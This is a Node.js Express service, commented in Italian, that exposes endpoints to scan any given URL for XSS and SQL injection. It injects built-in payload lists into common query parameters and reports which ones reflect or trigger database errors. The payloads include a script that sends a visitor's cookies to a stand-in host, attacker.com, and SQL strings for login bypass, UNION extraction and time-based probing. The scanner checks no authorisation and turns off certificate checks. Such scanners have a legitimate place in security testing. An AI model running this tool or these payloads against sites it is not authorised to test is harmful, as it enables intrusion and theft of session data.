const fs = require("fs");
const path = require("path");
const express = require("express");
const cors = require("cors");
const axios = require("axios");
const https = require("https");

const app = express();
const port = 3001;

app.use(cors({ origin: '*', methods: 'GET, POST', allowedHeaders: 'Content-Type, Authorization' }));

const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// File di log
const LOG_FILE = path.join(__dirname, "scan_results.log");
const writeLog = (data) => {
  const timestamp = new Date().toISOString();
  fs.appendFileSync(LOG_FILE, `[${timestamp}] ${JSON.stringify(data)}\n`);
};

// Payloads XSS (coerenti con quelli del file originale)
const xssAction = "document.body.innerHTML += '<div id=\\'xss-ok\\'>XSS ESEGUITO</div>'";
const xssPayloads = {
  base: [
    `<script>${xssAction}</script>`,
    `<script>console.log(document.cookie); ${xssAction}</script>`,
    `<script>fetch('https://attacker.com/steal?c='+document.cookie).then(() => {${xssAction}})</script>`
  ],
  events: [
    `<img src='x' onerror='${xssAction}'>`,
    `<body onload='${xssAction}'>`,
    `<svg onload='${xssAction}'>`
  ],
  dom: [
    `<a href='javascript:${xssAction}'>Click me</a>`
  ],
  encoded: [
    `&#60;script&#62;${xssAction}&#60;/script&#62;`
  ]
};

const sqlPayloads = {
  auth: ["' OR '1'='1", "\" OR \"1\"=\"1", "' OR '1'='1' --", "\" OR \"1\"=\"1\" --", "' OR 1=1 --", "admin' --", "admin' #", "admin\"--", "' OR 1=1 LIMIT 1;--", "1' OR '1' = '1"],
  union: ["' UNION SELECT 1,2,3 --", "' UNION SELECT NULL,NULL,NULL --", "' UNION SELECT @@version,2,3,4 --", "' UNION SELECT table_name,2 FROM information_schema.tables --"],
  error: ["' AND extractvalue(1, concat(0x7e, (SELECT version()))) --", "' AND updatexml(1, concat(0x7e, (SELECT version())), 1) --"],
  boolean: ["' AND 1=1 --", "' AND 1=2 --"],
  time: ["' AND SLEEP(1) --", "' OR SLEEP(1) --"],
  bypass: ["/*!50000select*/", "'/**/OR/**/1=1--"]
};

const sqlErrorPatterns = [
  /SQL syntax.*?MySQL/i,
  /Warning.*?mysqli/i,
  /PostgreSQL.*?ERROR/im,
  /SQL Server.*?Driver/i,
  /ORA-[0-9]+/i,
  /SQLite\.Exception/i,
  /Unclosed quotation mark/i
];

// Funzione per determinare la categoria di un payload
const getPayloadCategory = (payload, scanType) => {
  if (scanType === "xss") {
    for (const [category, payloads] of Object.entries(xssPayloads)) {
      if (payloads.includes(payload)) return category;
    }
  } else if (scanType === "sql") {
    for (const [category, payloads] of Object.entries(sqlPayloads)) {
      if (payloads.includes(payload)) return category;
    }
  }
  return "unknown";
};

const unifiedScan = async (url, payloads, options = {}, scanType = "sql") => {
  const {
    timeout = 5000,
    maxRetries = 3,
    delayBetweenRequests = 500,
    verbose = true,
    testParameters = ['id', 'user', 'item', 'page', 'search', 'query', 'category']
  } = options;

  const results = {
    vulnerabilities: [],
    testedUrls: [],
    vulnerableParameters: [],
    vulnerableCategories: new Set(),
    isVulnerable: false,
    errorDetails: []
  };

  const log = (msg) => { if (verbose) console.log(`[UnifiedScan] ${msg}`); };

  try {
    const urlObj = new URL(url);
    const existingParams = [...urlObj.searchParams.keys()];
    const paramsToTest = [...new Set([...existingParams, ...testParameters])];

    log(`Avvio scan di tipo ${scanType} su ${url}`);

    for (const param of paramsToTest) {
      for (const payload of payloads) {
        const testUrl = new URL(url);
        testUrl.searchParams.set(param, payload);
        const finalUrl = testUrl.toString();
        results.testedUrls.push(finalUrl);

        log(`Test su: ${finalUrl}`);

        for (let attempt = 0; attempt < maxRetries; attempt++) {
          try {
            const res = await axios.get(finalUrl, {
              timeout,
              validateStatus: () => true,
              httpsAgent: new https.Agent({ rejectUnauthorized: false })
            });

            const body = res.data.toString();
            const statusCode = res.status;

            if (scanType === "sql") {
              for (const pattern of sqlErrorPatterns) {
                if (pattern.test(body)) {
                  const category = getPayloadCategory(payload, scanType);
                  const vuln = { 
                    url: finalUrl, 
                    parameter: param, 
                    payload, 
                    category,
                    pattern: pattern.toString(), 
                    statusCode 
                  };
                  results.vulnerabilities.push(vuln);
                  results.vulnerableParameters.push(param);
                  results.vulnerableCategories.add(category);
                  results.isVulnerable = true;
                  writeLog({ type: scanType, result: vuln });
                  log(`✅ SQL vuln (${category}) su ${param}`);
                  break;
                }
              }
            } else if (scanType === "xss") {
              if (body.includes("<div id='xss-ok'>") || body.includes("XSS ESEGUITO")) {
                const category = getPayloadCategory(payload, scanType);
                const vuln = { 
                  url: finalUrl, 
                  parameter: param, 
                  payload, 
                  category,
                  statusCode 
                };
                results.vulnerabilities.push(vuln);
                results.vulnerableParameters.push(param);
                results.vulnerableCategories.add(category);
                results.isVulnerable = true;
                writeLog({ type: scanType, result: vuln });
                log(`✅ XSS vuln (${category}) su ${param}`);
                break;
              }
            }
            break;
          } catch (err) {
            const retryDelay = delayBetweenRequests * Math.pow(2, attempt);
            results.errorDetails.push({ url: finalUrl, parameter: param, payload, error: err.message });
            log(`⚠️ Errore: ${err.message}`);
            if (attempt < maxRetries - 1) await delay(retryDelay);
          }
        }
        await delay(delayBetweenRequests);
      }
    }

    if (results.isVulnerable) {
      log(`✅ Vulnerabilità trovate su ${url}`);
      results.vulnerableCategories = Array.from(results.vulnerableCategories);
    } else {
      log(`❌ Nessuna vulnerabilità su ${url}`);
      results.vulnerableCategories = [];
    }

    return results;
  } catch (err) {
    log(`❌ Errore fatale: ${err.message}`);
    results.error = err.message;
    results.vulnerableCategories = [];
    return results;
  }
};

app.get("/:type(scan|xssScan|sqlScan)", async (req, res) => {
  const { url } = req.query;
  const path = req.path;
  if (!url) return res.status(400).json({ message: "URL mancante" });

  const scanType = path.includes("xss") ? "xss" : "sql";

  const payloads = scanType === "xss"
    ? Object.values(xssPayloads).flat()
    : Object.values(sqlPayloads).flat();
  
  const options = {
    timeout: 10000,
    maxRetries: 2,
    delayBetweenRequests: 400,
    verbose: true
  };

  try {
    const results = await unifiedScan(url, payloads, options, scanType);
    if (results.isVulnerable) {
      // Raggruppa vulnerabilità per categoria
      const categoriesFound = {};
      
      results.vulnerabilities.forEach(vuln => {
        if (!categoriesFound[vuln.category]) {
          categoriesFound[vuln.category] = {
            count: 1,
            examples: [vuln.payload]
          };
        } else {
          categoriesFound[vuln.category].count++;
          if (categoriesFound[vuln.category].examples.length < 2) {
            categoriesFound[vuln.category].examples.push(vuln.payload);
          }
        }
      });
      
      res.status(200).json({
        url:url,
        message: `The URL ${url} is vulnerable.`,
        vulnerabilities: results.vulnerabilities,
        vulnerableParameters: [...new Set(results.vulnerableParameters)],
        vulnerableCategories: results.vulnerableCategories,
      });
    } else {
      res.status(200).json({
        message: `The URL ${url} is not vulnerable.`,
        testedUrls: results.testedUrls.length
      });
    }
  } catch (e) {
    res.status(500).json({ message: `Errore nella scansione ${scanType}`, error: e.message });
  }
});

app.listen(port, () => console.log(`🛡️  Server di sicurezza attivo sulla porta ${port}`));